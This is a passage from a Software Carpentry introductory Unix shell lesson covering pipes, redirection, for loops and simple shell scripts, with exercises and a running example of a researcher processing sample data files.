case,\nso cat just shows us what it contains:\n$ cat lengths.txt\n\n  20  cubane.pdb\n  12  ethane.pdb\n   9  methane.pdb\n  30  octane.pdb\n  21  pentane.pdb\n  15  propane.pdb\n 107  total\n\n Output Page by PageWe'll continue to use cat in this lesson, for convenience and consistency,\nbut it has the disadvantage that it always dumps the whole file onto your screen.\nMore useful in practice is the command less,\nwhich you use with $ less lengths.txt.\nThis displays a screenful of the file, and then stops.\nYou can go forward one screenful by pressing the spacebar,\nor back one by pressing b.  Press q to quit.\n\nNow let's use the sort command to sort its contents.\nWe will also use the -n flag to specify that the sort is\nnumerical instead of alphabetical.\nThis does not change the file;\ninstead, it sends the sorted result to the screen:\n$ sort -n lengths.txt\n\n  9  methane.pdb\n 12  ethane.pdb\n 15  propane.pdb\n 20  cubane.pdb\n 21  pentane.pdb\n 30  octane.pdb\n107  total\n\nWe can put the sorted list of lines in another temporary file called sorted-lengths.txt\nby putting > sorted-lengths.txt after the command,\njust as we used > lengths.txt to put the output of wc into lengths.txt.\nOnce we've done that,\nwe can run another command called head to get the first few lines in sorted-lengths.txt:\n$ sort -n lengths.txt > sorted-lengths.txt\n$ head -n 1 sorted-lengths.txt\n\n  9  methane.pdb\n\nUsing -n 1 with head tells it that\nwe only want the first line of the file;\n-n 20 would get the first 20,\nand so on.\nSince sorted-lengths.txt contains the lengths of our files ordered from least to greatest,\nthe output of head must be the file with the fewest lines.\n Redirecting to the same fileIt's a very bad idea to try redirecting\nthe output of a command that operates on a file\nto the same file. For example:\n$ sort -n lengths.txt > lengths.txt\n\nDoing something like this may give you\nincorrect results and/or delete\nthe contents of lengths.txt.\n\nIf you think this is confusing,\nyou're in good company:\neven once you understand what wc, sort, and head do,\nall those intermediate files make it hard to follow what's going on.\nWe can make it easier to understand by running sort and head together:\n$ sort -n lengths.txt | head -n 1\n\n  9  methane.pdb\n\nThe vertical bar, |, between the two commands is called a pipe.\nIt tells the shell that we want to use\nthe output of the command on the left\nas the input to the command on the right.\nThe computer might create a temporary file if it needs to,\nor copy data from one program to the other in memory,\nor something else entirely;\nwe don't have to know or care.\nNothing prevents us from chaining pipes consecutively.\nThat is, we can for example send the output of wc directly to sort,\nand then the resulting output to head.\nThus we first use a pipe to send the output of wc to sort:\n$ wc -l *.pdb | sort -n\n\n   9 methane.pdb\n  12 ethane.pdb\n  15 propane.pdb\n  20 cubane.pdb\n  21 pentane.pdb\n  30 octane.pdb\n 107 total\n\nAnd now we send the output of this pipe, through another pipe, to head, so that the full pipeline becomes:\n$ wc -l *.pdb | sort -n | head -n 1\n\n   9  methane.pdb\n\nThis is exactly like a mathematician nesting functions like log(3x)\nand saying \"the log of three times x\".\nIn our case,\nthe calculation is \"head of sort of line count of *.pdb\".\nHere's what actually happens behind the scenes when we create a pipe.\nWhen a computer runs a program --- any program --- it creates a process\nin memory to hold the program's software and its current state.\nEvery process has an input channel called standard input.\n(By this point, you may be surprised that the name is so memorable, but don't worry:\nmost Unix programmers call it \"stdin\").\nEvery process also has a default output channel called standard output\n(or \"stdout\"). A second output channel called standard error (stderr) also\nexists. This channel is typically used for error or diagnostic messages, and it\nallows a user to pipe the output of one program into another while still receiving\nerror messages in the terminal.\nThe shell is actually just another program.\nUnder normal circumstances,\nwhatever we type on the keyboard is sent to the shell on its standard input,\nand whatever it produces on standard output is displayed on our screen.\nWhen we tell the shell to run a program,\nit creates a new process\nand temporarily sends whatever we type on our keyboard to that process's standard input,\nand whatever the process sends to standard output to the screen.\nHere's what happens when we run wc -l *.pdb > lengths.txt.\nThe shell starts by telling the computer to create a new process to run the wc program.\nSince we've provided some filenames as arguments,\nwc reads from them instead of from standard input.\nAnd since we've used > to redirect output to a file,\nthe shell connects the process's standard output to that file.\nIf we run wc -l *.pdb | sort -n instead,\nthe shell creates two processes\n(one for each process in the pipe)\nso that wc and sort run simultaneously.\nThe standard output of wc is fed directly to the standard input of sort;\nsince there's no redirection with >,\nsort's output goes to the screen.\nAnd if we run wc -l *.pdb | sort -n | head -n 1,\nwe get three processes with data flowing from the files,\nthrough wc to sort,\nand from sort through head to the screen.\n\nThis simple idea is why Unix has been so successful.\nInstead of creating enormous programs that try to do many different things,\nUnix programmers focus on creating lots of simple tools that each do one job well,\nand that work well with each other.\nThis programming model is called \"pipes and filters\".\nWe've already seen pipes;\na filter is a program like wc or sort\nthat transforms a stream of input into a stream of output.\nAlmost all of the standard Unix tools can work this way:\nunless told to do otherwise,\nthey read from standard input,\ndo something with what they've read,\nand write to standard output.\nThe key is that any program that reads lines of text from standard input\nand writes lines of text to standard output\ncan be combined with every other program that behaves this way as well.\nYou can and should write your programs this way\nso that you and other people can put those programs into pipes to multiply their power.\n Redirecting InputAs well as using > to redirect a program's output, we can use  to\nredirect its input, i.e., to read from a file instead of from standard\ninput. For example, instead of writing wc ammonia.pdb, we could write\nwc . In the first case, wc gets a command line\nargument telling it what file to open. In the second, wc doesn't have\nany command line arguments, so it reads from standard input, but we\nhave told the shell to send the contents of ammonia.pdb to wc's\nstandard input.\n\nNelle's Pipeline: Checking Files\nNelle has run her samples through the assay machines\nand created 17 files in the north-pacific-gyre/2012-07-03 directory described earlier.\nAs a quick sanity check, starting from her home directory, Nelle types:\n$ cd north-pacific-gyre/2012-07-03\n$ wc -l *.txt\n\nThe output is 18 lines that look like this:\n300 NENE01729A.txt\n300 NENE01729B.txt\n300 NENE01736A.txt\n300 NENE01751A.txt\n300 NENE01751B.txt\n300 NENE01812A.txt\n... ...\n\nNow she types this:\n$ wc -l *.txt | sort -n | head -n 5\n\n 240 NENE02018B.txt\n 300 NENE01729A.txt\n 300 NENE01729B.txt\n 300 NENE01736A.txt\n 300 NENE01751A.txt\n\nWhoops: one of the files is 60 lines shorter than the others.\nWhen she goes back and checks it,\nshe sees that she did that assay at 8:00 on a Monday morning --- someone\nwas probably in using the machine on the weekend,\nand she forgot to reset it.\nBefore re-running that sample,\nshe checks to see if any files have too much data:\n$ wc -l *.txt | sort -n | tail -n 5\n\n 300 NENE02040B.txt\n 300 NENE02040Z.txt\n 300 NENE02043A.txt\n 300 NENE02043B.txt\n5040 total\n\nThose numbers look good --- but what's that 'Z' doing there in the third-to-last line?\nAll of her samples should be marked 'A' or 'B';\nby convention,\nher lab uses 'Z' to indicate samples with missing information.\nTo find others like it, she does this:\n$ ls *Z.txt\n\nNENE01971Z.txt    NENE02040Z.txt\n\nSure enough,\nwhen she checks the log on her laptop,\nthere's no depth recorded for either of those samples.\nSince it's too late to get the information any other way,\nshe must exclude those two files from her analysis.\nShe could just delete them using rm,\nbut there are actually some analyses she might do later where depth doesn't matter,\nso instead, she'll just be careful later on to select files using the wildcard expression *[AB].txt.\nAs always,\nthe * matches any number of characters;\nthe expression [AB] matches either an 'A' or a 'B',\nso this matches all the valid data files she has.\n What Does `sort -n` Do?If we run sort on this file:\n10\n2\n19\n22\n6\n\nthe output is:\n10\n19\n2\n22\n6\n\nIf we run sort -n on the same input, we get this instead:\n2\n6\n10\n19\n22\n\nExplain why -n has this effect.\n SolutionClick to expandThe -n flag specifies a numeric sort, rather than alphabetical.\n\n What Does `Change directory to data-shell (the top level of our downloaded example data).\nWhat is the difference between:\n$ wc -l notes.txt\n\nand:\n$ wc -l \n SolutionClick to expand is used to redirect input to a command.\nIn both examples, the shell returns the number of lines from the input to\nthe wc command.\nIn the first example, the input is the file notes.txt and the file name is\ngiven in the output from the wc command.\nIn the second example, the contents of the file notes.txt are redirected to\nstandard input.\nIt is as if we have entered the contents of the file by typing at the prompt.\nHence the file name is not given in the output - just the number of lines.\nTry this for yourself:\n$ wc -l\nthis\nis\na test\nCtrl-D # This lets the shell know you have finished typing the input\n{: .bash}\n3\n{: .output}\n\n What Does `>>` Mean?What is the difference between:\n$ echo hello > testfile01.txt\n\nand:\n$ echo hello >> testfile02.txt\n\nHint: Try executing each command twice in a row and then examining the output files.\n\n More on WildcardsSam has a directory containing calibration data, datasets, and descriptions of\nthe datasets:\n2015-10-23-calibration.txt\n2015-10-23-dataset1.txt\n2015-10-23-dataset2.txt\n2015-10-23-dataset_overview.txt\n2015-10-26-calibration.txt\n2015-10-26-dataset1.txt\n2015-10-26-dataset2.txt\n2015-10-26-dataset_overview.txt\n2015-11-23-calibration.txt\n2015-11-23-dataset1.txt\n2015-11-23-dataset2.txt\n2015-11-23-dataset_overview.txt\n\nBefore heading off to another field trip, she wants to back up her data and\nsend some datasets to her colleague Bob.

Similar to wildcards and tab completion, using loops also reduces the\namount of typing (and typing mistakes).\nSuppose we have several hundred genome data files named basilisk.dat, unicorn.dat, and so on.\nIn this example,\nwe'll use the creatures directory which only has two example files,\nbut the principles can be applied to many many more files at once.\nWe would like to modify these files, but also save a version of the original files, naming the copies\noriginal-basilisk.dat and original-unicorn.dat.\nWe can't use:\n$ cp *.dat original-*.dat\n\nbecause that would expand to:\n$ cp basilisk.dat unicorn.dat original-*.dat\n\nThis wouldn't back up our files, instead we get an error:\ncp: target `original-*.dat' is not a directory\n\nThis problem arises when cp receives more than two inputs. When this happens, it\nexpects the last input to be a directory where it can copy all the files it was passed.\nSince there is no directory named original-*.dat in the creatures directory we get an\nerror.\nInstead, we can use a loop\nto do some operation once for each thing in a list.\nHere's a simple example that displays the first three lines of each file in turn:\n$ for filename in basilisk.dat unicorn.dat\ndo\n   head -n 3 $filename\ndone\n\nCOMMON NAME: basilisk\nCLASSIFICATION: basiliscus vulgaris\nUPDATED: 1745-05-02\nCOMMON NAME: unicorn\nCLASSIFICATION: equus monoceros\nUPDATED: 1738-11-24\n\nWhen the shell sees the keyword for,\nit knows to repeat a command (or group of commands) once for each thing in a list.\nEach time the loop runs (called an iteration), an item in the list is assigned in sequence to\nthe variable, and the commands inside the loop are executed, before moving on to\nthe next item in the list.\nInside the loop,\nwe call for the variable's value by putting $ in front of it.\nThe $ tells the shell interpreter to treat\nthe variable as a variable name and substitute its value in its place,\nrather than treat it as text or an external command.\nIn this example, the list is two filenames: basilisk.dat and unicorn.dat.\nEach time the loop iterates, it will assign a file name to the variable filename\nand run the head command.\nThe first time through the loop,\n$filename is basilisk.dat.\nThe interpreter runs the command head on basilisk.dat,\nand the prints the\nfirst three lines of basilisk.dat.\nFor the second iteration, $filename becomes\nunicorn.dat. This time, the shell runs head on unicorn.dat\nand prints the first three lines of unicorn.dat.\nSince the list was only two items, the shell exits the for loop.\nWhen using variables it is also\npossible to put the names into curly braces to clearly delimit the variable\nname: $filename is equivalent to ${filename}, but is different from\n${file}name. You may find this notation in other people's programs.\n Follow the PromptThe shell prompt changes from $ to > and back again as we were\ntyping in our loop. The second prompt, >, is different to remind\nus that we haven't finished typing a complete command yet. A semicolon, ;,\ncan be used to separate two commands written on a single line.\n\n Same Symbols, Different MeaningsHere we see > being used a shell prompt, whereas > is also\nused to redirect output.\nSimilarly, $ is used as a shell prompt, but, as we saw earlier,\nit is also used to ask the shell to get the value of a variable.\nIf the shell prints > or $ then it expects you to type something,\nand the symbol is a prompt.\nIf you type > or $ yourself, it is an instruction from you that\nthe shell to redirect output or get the value of a variable.\n\nWe have called the variable in this loop filename\nin order to make its purpose clearer to human readers.\nThe shell itself doesn't care what the variable is called;\nif we wrote this loop as:\nfor x in basilisk.dat unicorn.dat\ndo\n    head -n 3 $x\ndone\n\nor:\nfor temperature in basilisk.dat unicorn.dat\ndo\n    head -n 3 $temperature\ndone\n\nit would work exactly the same way.\nDon't do this.\nPrograms are only useful if people can understand them,\nso meaningless names (like x) or misleading names (like temperature)\nincrease the odds that the program won't do what its readers think it does.\nHere's a slightly more complicated loop:\nfor filename in *.dat\ndo\n    echo $filename\n    head -n 100 $filename | tail -n 20\ndone\n\nThe shell starts by expanding *.dat to create the list of files it will process.\nThe loop body\nthen executes two commands for each of those files.\nThe first, echo, just prints its command-line arguments to standard output.\nFor example:\n$ echo hello there\n\nprints:\nhello there\n\nIn this case,\nsince the shell expands $filename to be the name of a file,\necho $filename just prints the name of the file.\nNote that we can't write this as:\nfor filename in *.dat\ndo\n    $filename\n    head -n 100 $filename | tail -n 20\ndone\n\nbecause then the first time through the loop,\nwhen $filename expanded to basilisk.dat, the shell would try to run basilisk.dat as a program.\nFinally,\nthe head and tail combination selects lines 81-100\nfrom whatever file is being processed\n(assuming the file has at least 100 lines).\n Spaces in NamesWhitespace is used to separate the elements on the list\nthat we are going to loop over. If on the list we have elements\nwith whitespace we need to quote those elements\nand our variable when using it.\nSuppose our data files are named:\nred dragon.dat\npurple unicorn.dat\n\nWe need to use\nfor filename in \"red dragon.dat\" \"purple unicorn.dat\"\ndo\n    head -n 100 \"$filename\" | tail -n 20\ndone\n\nIt is simpler just to avoid using whitespaces (or other special characters) in filenames.\nThe files above don't exist, so if we run the above code, the head command will be unable\nto find them, however the error message returned will show the name of the files it is\nexpecting:\nhead: cannot open ‘red dragon.dat’ for reading: No such file or directory\nhead: cannot open ‘purple unicorn.dat’ for reading: No such file or directory\n{: .output}\nTry removing the quotes around $filename in the loop above to see the effect of the quote\nmarks on whitespace:\nhead: cannot open ‘red’ for reading: No such file or directory\nhead: cannot open ‘dragon.dat’ for reading: No such file or directory\nhead: cannot open ‘purple’ for reading: No such file or directory\nhead: cannot open ‘unicorn.dat’ for reading: No such file or directory\n{: . output}\n\nGoing back to our original file copying problem,\nwe can solve it using this loop:\nfor filename in *.dat\ndo\n    cp $filename original-$filename\ndone\n\nThis loop runs the cp command once for each filename.\nThe first time,\nwhen $filename expands to basilisk.dat,\nthe shell executes:\ncp basilisk.dat original-basilisk.dat\n\nThe second time, the command is:\ncp unicorn.dat original-unicorn.dat\n\nSince the cp command does not normally produce any output, it's hard to check\nthat the loop is doing the correct thing. By prefixing the command with echo\nit is possible to see each command as it would be executed. The following diagram\nshows what happens when the modified script is executed, and demonstrates how the\njudicious use of echo is a good debugging technique.\n\n Nelle's Pipeline: Processing FilesNelle is now ready to process her data files.\nSince she's still learning how to use the shell,\nshe decides to build up the required commands in stages.\nHer first step is to make sure that she can select the right files --- remember,\nthese are ones whose names end in 'A' or 'B', rather than 'Z'. Starting from her home directory, Nelle types:\n$ cd north-pacific-gyre/2012-07-03\n$ for datafile in NENE*[AB].txt\ndo\n    echo $datafile\ndone\n\nNENE01729A.txt\nNENE01729B.txt\nNENE01736A.txt\n...\nNENE02043A.txt\nNENE02043B.txt\n\nHer next step is to decide\nwhat to call the files that the goostats analysis program will create.\nPrefixing each input file's name with \"stats\" seems simple,\nso she modifies her loop to do that:\n$ for datafile in NENE*[AB].txt\ndo\n    echo $datafile stats-$datafile\ndone\n\nNENE01729A.txt stats-NENE01729A.txt\nNENE01729B.txt stats-NENE01729B.txt\nNENE01736A.txt stats-NENE01736A.txt\n...\nNENE02043A.txt stats-NENE02043A.txt\nNENE02043B.txt stats-NENE02043B.txt\n\nShe hasn't actually run goostats yet,\nbut now she's sure she can select the right files and generate the right output filenames.\nTyping in commands over and over again is becoming tedious,\nthough,\nand Nelle is worried about making mistakes,\nso instead of re-entering her loop,\nshe presses the up arrow.\nIn response,\nthe shell redisplays the whole loop on one line\n(using semi-colons to separate the pieces):\n$ for datafile in NENE*[AB].txt; do echo $datafile stats-$datafile; done\n\nUsing the left arrow key,\nNelle backs up and changes the command echo to bash goostats:\n$ for datafile in NENE*[AB].txt; do bash goostats $datafile stats-$datafile; done\n\nWhen she presses Enter,\nthe shell runs the modified command.\nHowever, nothing appears to happen --- there is no output.\nAfter a moment, Nelle realizes that since her script doesn't print anything to the screen any longer,\nshe has no idea whether it is running, much less how quickly.\nShe kills the running command by typing Ctrl-C,\nuses up-arrow to repeat the command,\nand edits it to read:\n$ for datafile in NENE*[AB].txt; do echo $datafile; bash goostats $datafile stats-$datafile; done\n\n Variables in LoopsClick to expandThis exercise refers to the data-shell/molecules directory.\nls gives the following output:\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\n\nWhat is the output of the following code?\nfor datafile in *.pdb\ndo\n    ls *.pdb\ndone\n\nNow, what is the output of the following code?\nfor datafile in *.pdb\ndo\n>    ls $datafile\ndone\n\nWhy do these two loops give different outputs?\nSolution\nThe first code block gives the same output on each iteration through\nthe loop.\nBash expands the wildcard *.pdb within the loop body (as well as\nbefore the loop starts) to match all files ending in .pdb\nand then lists them using ls.\nThe expanded loop would look like this:\nfor datafile in cubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ndo\n>    ls cubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ndone\n{: .bash}\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\ncubane.pdb  ethane.pdb  methane.pdb  octane.pdb  pentane.pdb  propane.pdb\n{: .output}\nThe second code block lists a different file on each loop iteration.\nThe value of the datafile variable is evaluated using $datafile,\nand then listed using ls.\ncubane.pdb\nethane.pdb\nmethane.pdb\noctane.pdb\npentane.pdb\npropane.pdb\n{: .output}\n\n Saving to a File in a Loop - Part OneIn the same directory, what is the effect of this loop?\nfor alkanes in *.pdb\ndo\n    echo $alkanes\n    cat $alkanes > alkanes.pdb\ndone\n\n\nPrints cubane.pdb, ethane.pdb, methane.pdb, octane.pdb, pentane.pdb and propane.pdb,\nand the text from propane.pdb will be saved to a file called alkanes.pdb.\nPrints cubane.pdb, ethane.pdb, and methane.pdb, and the text from all three files would be\nconcatenated and saved to a file called alkanes.pdb.\nPrints cubane.pdb, ethane.pdb, methane.pdb, octane.pdb, and pentane.pdb, and the text\nfrom propane.pdb will be saved to a file called alkanes.pdb.\nNone of the above.\n\n SolutionClick to expand\nThe text from each file in turn gets written to the alkanes.pdb file.\nHowever, the file gets overwritten on each loop interation, so the final content of alkanes.pdb\nis the text from the propane.pdb file.\n\n\n Saving to a File in a Loop - Part TwoIn the same directory, what would be the output of the following loop?\nfor datafile in *.pdb\ndo\n    cat $datafile >> all.pdb\ndone\n\n\nAll of the text from cubane.pdb, ethane.pdb, methane.pdb, octane.pdb, and\npentane.pdb would be concatenated and saved to a file called all.pdb.\nThe text from ethane.pdb will be saved to a file called all.pdb.\nAll of the text from cubane.pdb, ethane.pdb, methane.pdb, octane.pdb, pentane.pdb\nand propane.pdb would be concatenated and saved to a file called all.pdb.\nAll of the text from cubane.pdb, ethane.pdb, methane.pdb, octane.pdb, pentane.pdb\nand propane.pdb would be printed to the screen and saved to a file called all.pdb.\n\n SolutionClick to expand3 is the correct answer. >> appends to a file, rather than overwriting it with the redirected\noutput from a command.\nGiven the output from the cat command has been redirected, nothing is printed to the screen.\n\n Limiting Sets of FilesIn the same directory, what would be the output of the following loop?\nfor filename in c*\ndo\n    ls $filename\ndone\n\n\nNo files are listed.\nAll files are listed.\nOnly cubane.pdb, octane.pdb and pentane.pdb are listed.\nOnly cubane.pdb is listed.\n\n SolutionClick to expand4 is the correct answer. * matches zero or more characters, so any file name starting with\nthe letter c, followed by zero or more other characters will be matched.\nHow would the output differ from using this command instead?\nfor filename in *c*\ndo\n    ls $filename\ndone\n\n\nThe same files would be listed.\nAll the files are listed this time.\nNo files are listed this time.\nThe files cubane.pdb and octane.pdb will be listed.\nOnly the file octane.pdb will be listed.\n\n SolutionClick to expand4 is the correct answer. * matches zero or more characters, so a file name with zero or more\ncharacters before a letter c and zero or more characters after the letter c will be matched.\n\n Doing a Dry RunA loop is a way to do many things at once --- or to make many mistakes at\nonce if it does the wrong thing. One way to check what a loop would do\nis to echo the commands it would run instead of actually running them.\nSuppose we want to preview the commands the following loop will execute\nwithout actually running those commands:\nfor file in *.pdb\ndo\n  analyze $file > analyzed-$file\ndone\n\nWhat is the difference between the two loops below, and which one would we\nwant to run?\n# Version 1\nfor file in *.pdb\ndo\n  echo analyze $file > analyzed-$file\ndone\n\n# Version 2\nfor file in *.pdb\ndo\n  echo \"analyze $file > analyzed-$file\"\ndone\n\n SolutionClick to expandThe second version is the one we want to run.\nThis prints to screen everything enclosed in the quote marks, expanding the\nloop variable name because we have prefixed it with a dollar sign.\nThe first version redirects the output from the command echo analyze $file to\na file, analyzed-$file. A series of files is generated: analyzed-cubane.pdb,\nanalyzed-ethane.pdb etc.\nTry both versions for yourself to see the output! Be sure to open the\nanalyzed-*.pdb files to view their contents.\n\n Nested LoopsSuppose we want to set up up a directory structure to organize\nsome experiments measuring reaction rate constants with different compounds\nand different temperatures.  What would be the\nresult of the following code:\nfor species in cubane ethane methane\ndo\n    for temperature in 25 30 37 40\n    do\n        mkdir $species-$temperature\n    done\ndone\n\n SolutionClick to expandWe have a nested loop, i.e. contained within another loop, so for each species\nin the outer loop, the inner loop (the nested loop) iterates over the list of\ntemperatures, and creates a new directory for each combination.\nTry running the code for yourself to see which directories are created!\n\n Key Points\nA for loop repeats commands once for every thing in a list.\nEvery for loop needs a variable to refer to the thing it is currently operating on.\nUse $name to expand a variable (i.e., get its value). ${name} can also be used.\nDo not use spaces, quotes, or wildcard characters such as '*' or '?' in filenames, as it complicates variable expansion.\nGive files consistent names that are easy to match with wildcard patterns to make it easy to select them for looping.\nUse the up-arrow key to scroll up through previous commands to edit and repeat them.\nUse Ctrl-R to search through the previously entered commands.\nUse history to display recent commands, and !number to repeat a command by number.\n\n\nCC BY 4.0 - Based on shell-novice © 2016–2017 Software Carpentry Foundation\n"},"shell/06-script.html":{"url":"shell/06-script.html","title":"Shell Scripts","keywords":"","body":"Shell Scripts\n Learning Objectives\nWrite a shell script that runs a command or series of commands for a fixed set of files.\nRun a shell script from the command line.\nWrite a shell script that operates on a set of files defined by the user on the command line.\nCreate pipelines that include shell scripts you, and others, have written.\n\n\nWe are finally ready to see what makes the shell such a powerful programming environment.\nWe are going to take the commands we repeat frequently and save them in files\nso that we can re-run all those operations again later by typing a single command.\nFor historical reasons,\na bunch of commands saved in a file is usually called a shell script,\nbut make no mistake:\nthese are actually small programs.\nLet's start by going back to molecules/ and creating a new file, middle.sh which will\nbecome our shell script:\n$ cd molecules\n$ nano middle.sh\n\nThe command nano middle.sh opens the file middle.sh within the text editor \"nano\"\n(which runs within the shell).\nIf the file does not exist, it will be created.\nWe can use the text editor to directly edit the file -- we'll simply insert the following line:\nhead -n 15 octane.pdb | tail -n 5\n\nThis is a variation on the pipe we constructed earlier:\nit selects lines 11-15 of the file octane.pdb.\nRemember, we are not running it as a command just yet:\nwe are putting the commands in a file.\nThen we save the file (Ctrl-O in nano),\n and exit the text editor (Ctrl-X in nano).\nCheck that the directory molecules now contains a file called middle.sh.\nOnce we have saved the file,\nwe can ask the shell to execute the commands it contains.\nOur shell is called bash, so we run the following command:\n$ bash middle.sh\n\nATOM      9  H           1      -4.502   0.681   0.785  1.00  0.00\nATOM     10  H           1      -5.254  -0.243  -0.537  1.00  0.00\nATOM     11  H           1      -4.357   1.252  -0.895  1.00  0.00\nATOM     12  H           1      -3.009  -0.741  -1.467  1.00  0.00\nATOM     13  H           1      -3.172  -1.337   0.206  1.00  0.00\n\nSure enough,\nour script's output is exactly what we would get if we ran that pipeline directly.\n Text vs. WhateverWe usually call programs like Microsoft Word or LibreOffice Writer \"text\neditors\", but we need to be a bit more careful when it comes to\nprogramming.

When editing programs, therefore, you must either use a plain\ntext editor, or be careful to save files as plain text.\n\nWhat if we want to select lines from an arbitrary file?\nWe could edit middle.sh each time to change the filename,\nbut that would probably take longer than just retyping the command.\nInstead, let's edit middle.sh and make it more versatile:\n$ nano middle.sh\n\nNow, within \"nano\", replace the text octane.pdb with the special variable called $1:\nhead -n 15 \"$1\" | tail -n 5\n\nInside a shell script,\n$1 means \"the first filename (or other argument) on the command line\".\nWe can now run our script like this:\n$ bash middle.sh octane.pdb\n\nATOM      9  H           1      -4.502   0.681   0.785  1.00  0.00\nATOM     10  H           1      -5.254  -0.243  -0.537  1.00  0.00\nATOM     11  H           1      -4.357   1.252  -0.895  1.00  0.00\nATOM     12  H           1      -3.009  -0.741  -1.467  1.00  0.00\nATOM     13  H           1      -3.172  -1.337   0.206  1.00  0.00\n\nor on a different file like this:\n$ bash middle.sh pentane.pdb\n\nATOM      9  H           1       1.324   0.350  -1.332  1.00  0.00\nATOM     10  H           1       1.271   1.378   0.122  1.00  0.00\nATOM     11  H           1      -0.074  -0.384   1.288  1.00  0.00\nATOM     12  H           1      -0.048  -1.362  -0.205  1.00  0.00\nATOM     13  H           1      -1.183   0.500  -1.412  1.00  0.00\n\n Double-Quotes Around ArgumentsFor the same reason that we put the loop variable inside double-quotes,\nin case the filename happens to contain any spaces,\nwe surround $1 with double-quotes.\n\nWe still need to edit middle.sh each time we want to adjust the range of lines,\nthough.\nLet's fix that by using the special variables $2 and $3 for the\nnumber of lines to be passed to head and tail respectively:\n$ nano middle.sh\n\nhead -n \"$2\" \"$1\" | tail -n \"$3\"\n\nWe can now run:\n$ bash middle.sh pentane.pdb 15 5\n\nATOM      9  H           1       1.324   0.350  -1.332  1.00  0.00\nATOM     10  H           1       1.271   1.378   0.122  1.00  0.00\nATOM     11  H           1      -0.074  -0.384   1.288  1.00  0.00\nATOM     12  H           1      -0.048  -1.362  -0.205  1.00  0.00\nATOM     13  H           1      -1.183   0.500  -1.412  1.00  0.00\n\nBy changing the arguments to our command we can change our script's\nbehaviour:\n$ bash middle.sh pentane.pdb 20 5\n\nATOM     14  H           1      -1.259   1.420   0.112  1.00  0.00\nATOM     15  H           1      -2.608  -0.407   1.130  1.00  0.00\nATOM     16  H           1      -2.540  -1.303  -0.404  1.00  0.00\nATOM     17  H           1      -3.393   0.254  -0.321  1.00  0.00\nTER      18              1\n\nThis works,\nbut it may take the next person who reads middle.sh a moment to figure out what it does.\nWe can improve our script by adding some comments at the top:\n$ nano middle.sh\n\n# Select lines from the middle of a file.\n# Usage: bash middle.sh filename end_line num_lines\nhead -n \"$2\" \"$1\" | tail -n \"$3\"\n\nA comment starts with a # character and runs to the end of the line.\nThe computer ignores comments,\nbut they're invaluable for helping people (including your future self) understand and use scripts.\nThe only caveat is that each time you modify the script,\nyou should check that the comment is still accurate:\nan explanation that sends the reader in the wrong direction is worse than none at all.\nWhat if we want to process many files in a single pipeline?\nFor example, if we want to sort our .pdb files by length, we would type:\n$ wc -l *.pdb | sort -n\n\nbecause wc -l lists the number of lines in the files\n(recall that wc stands for 'word count', adding the -l flag means 'count lines' instead)\nand sort -n sorts things numerically.\nWe could put this in a file,\nbut then it would only ever sort a list of .pdb files in the current directory.\nIf we want to be able to get a sorted list of other kinds of files,\nwe need a way to get all those names into the script.\nWe can't use $1, $2, and so on\nbecause we don't know how many files there are.\nInstead, we use the special variable $@,\nwhich means,\n\"All of the command-line arguments to the shell script.\"\nWe also should put $@ inside double-quotes\nto handle the case of arguments containing spaces\n(\"$@\" is equivalent to \"$1\" \"$2\" ...)\nHere's an example:\n$ nano sorted.sh\n\n# Sort filenames by their length.\n# Usage: bash sorted.sh one_or_more_filenames\nwc -l \"$@\" | sort -n\n\n$ bash sorted.sh *.pdb ../creatures/*.dat\n\n9 methane.pdb\n12 ethane.pdb\n15 propane.pdb\n20 cubane.pdb\n21 pentane.pdb\n30 octane.pdb\n163 ../creatures/basilisk.dat\n163 ../creatures/unicorn.dat\n\n Why Isn't It Doing Anything?What happens if a script is supposed to process a bunch of files, but we\ndon't give it any filenames? For example, what if we type:\n$ bash sorted.sh\n\nbut don't say *.dat (or anything else)? In this case, $@ expands to\nnothing at all, so the pipeline inside the script is effectively:\n$ wc -l | sort -n\n\nSince it doesn't have any filenames, wc assumes it is supposed to\nprocess standard input, so it just sits there and waits for us to give\nit some data interactively. From the outside, though, all we see is it\nsitting there: the script doesn't appear to do anything.\n\nSuppose we have just run a series of commands that did something useful --- for example,\nthat created a graph we'd like to use in a paper.\nWe'd like to be able to re-create the graph later if we need to,\nso we want to save the commands in a file.\nInstead of typing them in again\n(and potentially getting them wrong)\nwe can do this:\n$ history | tail -n 5 > redo-figure-3.sh\n\nThe file redo-figure-3.sh now contains:\n297 bash goostats NENE01729B.txt stats-NENE01729B.txt\n298 bash goodiff stats-NENE01729B.txt /data/validated/01729.txt > 01729-differences.txt\n299 cut -d ',' -f 2-3 01729-differences.txt > 01729-time-series.txt\n300 ygraph --format scatter --color bw --borders none 01729-time-series.txt figure-3.png\n301 history | tail -n 5 > redo-figure-3.sh\n\n(goostats is a shell script which calculates some complicated statistics from a protein sample file -- the first argument -- and writes them to a file -- the second argument.\ngoodiffis a shell script for comparing statistics between two files, provides as arguments. Nelle's supervisor provided them without too many explanations.)\nAfter a moment's work in an editor to remove the serial numbers on the commands,\nand to remove the final line where we called the history command,\nwe have a completely accurate record of how we created that figure.\nIn practice, most people develop shell scripts by running commands at the shell prompt a few times\nto make sure they're doing the right thing,\nthen saving them in a file for re-use.\nThis style of work allows people to recycle\nwhat they discover about their data and their workflow with one call to history\nand a bit of editing to clean up the output\nand save it as a shell script.\n Nelle's Pipeline: Creating a ScriptNelle's supervisor insisted that all her analytics must be reproducible. The easiest way to capture all the steps is in a script.\nShe runs the editor and writes the following:\n# Calculate stats for data files.\nfor datafile in \"$@\"\ndo\n    echo $datafile\n    bash goostats $datafile stats-$datafile\ndone\n\nShe saves this in a file called do-stats.sh\nso that she can now re-do the first stage of her analysis by typing:\n$ bash do-stats.sh *[AB].txt\n\nShe can also do this:\n$ bash do-stats.sh *[AB].txt | wc -l\n\nso that the output is just the number of files processed\nrather than the names of the files that were processed.\nOne thing to note about Nelle's script is that\nit lets the person running it decide what files to process.\nShe could have written it as:\n# Calculate stats for 